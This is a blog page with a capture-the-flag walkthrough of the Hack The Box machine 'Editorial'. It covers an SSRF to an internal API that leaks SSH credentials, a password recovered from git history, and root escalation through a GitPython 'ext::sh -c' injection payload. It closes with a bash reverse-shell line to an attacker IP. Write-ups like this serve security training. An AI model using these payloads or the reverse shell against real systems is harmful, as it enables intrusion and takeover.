<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="HTB - Linux - Easy" />
<meta name="keywords" content=", linux" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/walkthroughs/editorial/" />


    <title>
        
            Editorial :: TheFizzyFish 
        
    </title>





<link rel="stylesheet" href="/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="Editorial">
  <meta itemprop="description" content="HTB - Linux - Easy">
  <meta itemprop="datePublished" content="2024-08-24T16:50:47-04:00">
  <meta itemprop="dateModified" content="2024-08-24T16:50:47-04:00">
  <meta itemprop="wordCount" content="930">
  <meta itemprop="image" content="http://localhost:1313/">
  <meta itemprop="keywords" content="Linux">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/">
  <meta name="twitter:title" content="Editorial">
  <meta name="twitter:description" content="HTB - Linux - Easy">







    <meta property="article:published_time" content="2024-08-24 16:50:47 -0400 EDT" />











    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text ">
                $ cd /root/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/common/">Common.txt</a></li><li><a href="/walkthroughs/">Walkthroughs</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/walkthroughs/editorial/">Editorial</a></h2>

            
            
            

            <div class="post-content">
                <h1 id="enum">Enum</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -p- -T5 -oN all-ports.nmap $IP
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp open  ssh
</span></span><span style="display:flex;"><span>80/tcp open  http
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -p22,80 -A -oN service-scan.nmap $IP        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-22 13:57 EDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.20
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.026s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://editorial.htb
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h1 id="80">80</h1>
<p>Began scan with whatweb</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ whatweb $IP
</span></span><span style="display:flex;"><span>http://10.10.11.20 <span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.11.20<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>http://editorial.htb<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>ERROR Opening: http://editorial.htb - no address <span style="color:#66d9ef">for</span> editorial.htb
</span></span></code></pre></div><p>Need to add to hosts file and try again:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ whatweb http://editorial.htb
</span></span><span style="display:flex;"><span>http://editorial.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.11.20<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Editorial Tiempo Arriba<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
</span></span></code></pre></div><h3 id="fuzzing-dirs">Fuzzing Dirs</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ URL<span style="color:#f92672">=</span>http://editorial.htb/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc <span style="color:#ae81ff">404</span> <span style="color:#e6db74">&#34;</span>$URL<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: http://editorial.htb/FUZZ
</span></span><span style="display:flex;"><span>Total requests: 62283
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                            
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>000000088:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">209</span> L    <span style="color:#ae81ff">537</span> W      <span style="color:#ae81ff">7134</span> Ch     <span style="color:#e6db74">&#34;upload&#34;</span>                                                                           
</span></span><span style="display:flex;"><span>000000126:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">71</span> L     <span style="color:#ae81ff">232</span> W      <span style="color:#ae81ff">2938</span> Ch     <span style="color:#e6db74">&#34;about&#34;</span>                                                                            
</span></span><span style="display:flex;"><span>000004255:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">176</span> L    <span style="color:#ae81ff">589</span> W      <span style="color:#ae81ff">8562</span> Ch     <span style="color:#e6db74">&#34;http://editorial.htb/&#34;</span>                                                            
</span></span><span style="display:flex;"><span>000030014:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">176</span> L    <span style="color:#ae81ff">589</span> W      <span style="color:#ae81ff">8562</span> Ch     <span style="color:#e6db74">&#34;http://editorial.htb/&#34;</span>                                                            
</span></span><span style="display:flex;"><span>000059103:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">176</span> L    <span style="color:#ae81ff">589</span> W      <span style="color:#ae81ff">8562</span> Ch     <span style="color:#e6db74">&#34;http://editorial.htb/&#34;</span>  
</span></span></code></pre></div><p>Upload directory is the most interesting.</p>
<p>Browsing directly to the web page gives another possible hostname we can add to our hosts file.
<em>Doesn&rsquo;t lead anywhere</em></p>
<p><code>tiempoarriba.htb</code></p>
<h4 id="upload-directory">Upload Directory</h4>
<p>A couple possible options to abuse, there&rsquo;s a search function, we can upload a &ldquo;preview&rdquo;, and we may be able to include a URL.</p>
<p>The send book function isn&rsquo;t all that interesting as it doesn&rsquo;t send anything we can work with. The <code>preview</code> option is interesting as we can submit an URL and see it perform a GET request using python.</p>
<p>Sending a request and picking it up on our python server:</p>
<p>The response also returns something different if it&rsquo;s successful or not, unsuccuessful requests return a URL in /static/images containing unsplash.</p>
<p>Successful requests point to a /static/uploads file that we can download and view</p>
<p>We&rsquo;re not able execute code directly, but we can use ffuf to enumerate any other listening ports we don&rsquo;t have access to via the web server on port 80.</p>
<p>Changing our URL value to <code>http://127.0.0.1:FUZZ</code> and copying our request to a file named 127.0.0.1.req in burpwill allow us to enumerate any other listening ports:</p>
<p>Which we can then run FFUF against, excluding the unsplash from our successful results (as they all return 200s)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ffuf -request 127.0.0.1.req -request-proto http -w /opt/SecLists/Discovery/Infrastructure/common-http-ports.txt -fr unsplash      
</span></span></code></pre></div><p>We can check to see what uri is included in the response and use curl to get the contents of the page:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ curl $URL/static/uploads/42f3802b-f94d-4148-afd7-5215529a8ada | jq
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;messages&#34;</span>: <span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;promotions&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve a list of all the promotions in our library.&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/promos&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;coupons&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve the list of coupons to use in our library.&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/coupons&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;new_authors&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve the welcome message sended to our new authors.&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/authors&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;platform_use&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve examples of how to use the platform.&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/how_to_use_platform&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">]</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;version&#34;</span>: <span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;changelog&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve a list of all the versions and updates of the api.&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/changelog&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;latest&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve the last version of api.&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>Next we can check out the endpoints:</p>
<p>http://127.0.0.1:5000/api/latest/metadata/messages/authors has creds</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;template_mail_message&#34;</span>:<span style="color:#e6db74">&#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team.&#34;</span>}
</span></span></code></pre></div><p><code>dev:dev080217_devAPI!@</code> which allows us to login via ssh</p>
<hr>
<h1 id="foothold">Foothold</h1>
<p>Foothold is found during enumeration of the web application on port 80. We find we are able to perform SSRFs and enumerate another web server on port 5000 on localhost of the box. We can then enumerate different api endpoints until we find plaintext creds allowing us to login via ssh as <code>dev</code>.</p>
<h2 id="exploits">Exploits</h2>
<hr>
<h1 id="privesc">PrivEsc</h1>
<p>Interestingly we find a .git directory with a potential user <code>dev-carlos.valderrama</code></p>
<p>Checking passwd, that user doesn&rsquo;t appear to be local</p>
<p>We can check the different commits for any sensitive info:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps/.git$ git log
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dev@editorial:~/apps/.git$ git show 1e84a036b2f33c59e2390730699a488c65643d28
</span></span></code></pre></div><p>One pops out as it mentions <code>internal</code> info</p>
<p><code>prod:080217_Producti0n_2023!@</code></p>
<p>Nice!</p>
<p>We can switch users to prod and we find we can run sudo</p>
<p>Checking out the script;</p>
<p>No luck trying to escape commands, but we can look at the packages the script imports and check their versions:</p>
<p>We see it&rsquo;s using <code>GitPython 3.1.29</code>, and there&rsquo;s an exploit for it</p>
<p>POC to test for code execution:</p>
<pre tabindex="0"><code># `&#39;ext::sh -c touch% /tmp/pwned&#39;`
</code></pre><p>When we run the command we see a new file in /tmp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span style="color:#e6db74">&#39;ext::sh -c touch% /tmp/pwned&#39;</span>
</span></span></code></pre></div><p>We can copy the root flag to the temp directory to read it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span style="color:#e6db74">&#39;ext::sh -c cat% /root/root.txt% &gt;% /tmp/pwned&#39;</span>
</span></span></code></pre></div><h2 id="exploits-1">Exploits</h2>
<p><a href="https://github.com/gitpython-developers/GitPython/issues/1515">https://github.com/gitpython-developers/GitPython/issues/1515</a></p>
<hr>
<h1 id="postpivot">Post/Pivot</h1>
<p>We can also easily get a rev shell as root if we wanted to loot the box further:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:/opt/internal_apps/clone_changes$ echo <span style="color:#e6db74">&#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.7/9001 0&gt;&amp;1&#39;</span> &gt;&gt; /tmp/rev.sh
</span></span></code></pre></div><hr>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="http://localhost:1313/tags/linux/">linux</a></span>
        
    </p>

            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/"></a></span>
            <span></span>
            
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by Four Gnomes in a Hoodie</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>




    </body>
</html>
